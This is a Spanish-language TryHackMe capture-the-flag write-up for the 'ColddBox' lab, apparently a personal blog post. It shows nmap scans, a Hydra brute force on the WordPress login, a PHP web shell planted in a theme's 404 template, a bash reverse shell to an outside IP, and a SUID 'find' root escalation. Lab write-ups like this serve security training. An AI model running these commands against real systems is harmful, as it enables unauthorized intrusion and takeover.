---
layout: single
title: Colddbox - TryHackMe
excerpt: " ﻿﻿Can you get access and get both flags?
Good Luck!. "
date: 2023-01-24
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-colddbox/colddbox.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - hydra
  - wordpress
  - rce
  - php
  - suid
---

Can you get access and get both **flags**?
Good Luck!.

# Summary
- IP: 10.10.125.23
- Ports: 80, 4512
- OS: Linux (Ubuntu)
- Services & Applications:
	-  80 -> Apache httpd 2.4.18
	-  4512 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.10

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.125.23 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,8080 -sCV 10.10.125.23 -oN targeted
```



# Análisis de página web:

- Abrimos la página, vemos una página de Wordpress; buscamos directorios, primero con nmap:

```bash
$nmap --script http-enum -p80 10.10.125.23 -oN webScan
```

- Encontramos un archivo "wp-login.php", ingresamos y encontramos el login principal de Wordpress.

- Existe otro directorio "/hidden" en el cual podemos enumerar posibles usuarios: c0ldd,hugo.


# Fuerza bruta con Hydra:

- Hacemos un ataque de fuerza bruta con Hydra para intentar obtener la contraseña de los usuarios encontrados, para esto, primero probamos ingresar en el login con el usuario "c0ldd" y vemos que nos arroja el mensaje "The password you entered for the username c0ldd is incorrect", esto quiere decir que el usuario "c0ldd" es un usuario válido; interceptamos la petición con Burpsuite para extraer la información necesaria para el ataque:

- Vemos que se trata de una petición por POST y las credenciales se especifican en la siguiente linea:

```html
log=c0ldd&pwd=test&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
```

- Con esta información, procedemos a realiza el ataque con Hydra:

```bash
$hydra -l c0ldd -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.20.135 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:The password you entered for the username" -t 30
```

- Obtenemos la credencial para el usuario "c0ldd", con esto accedemos en el login de Wordpress.



# Explotación básica de WordPress (RCE):

- Ya autenticado, vamos a la pestaña de "appeareance"  y clickeamos en "editor" .

- Escogemos una plantilla cualquiera, en este caso "Twenty Thirteen" y escogemos la template del recurso "404".

- Editamos poniéndole código PHP que nos permita ejecutar comandos de forma remota mediante el parámetro "cmd":

```php
<?php echo passthru($_GET["cmd"]); ?>
```

- Guardamos el recurso y accedemos a él siguiente el link:


```
http://10.10.20.135/wp-content/themes/twentythirteen/404.php?cmd=whoami
```

- Confirmamos el RCE y entablamos una reverse shell básica:

```
http://10.10.20.135/wp-content/themes/twentythirteen/404.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.18.101.123/443 0>%261"
```

- Accedemos como el usuario "www-data"



# ESCALANDO PRIVILEGIOS:


- Buscamos permisos SUID

```bash
$find / -perm -4000 2>/dev/null
```

- Vemos que el binario "find" se puede ejecutar como el propietario "root" de forma temporal, buscamos en "gtfobins" una forma de explotar este binario y encontramos el siguiente comando.

```bash
./find . -exec /bin/sh -p \; -quit
```

- Lo ejecutamos y seremos ROOT.
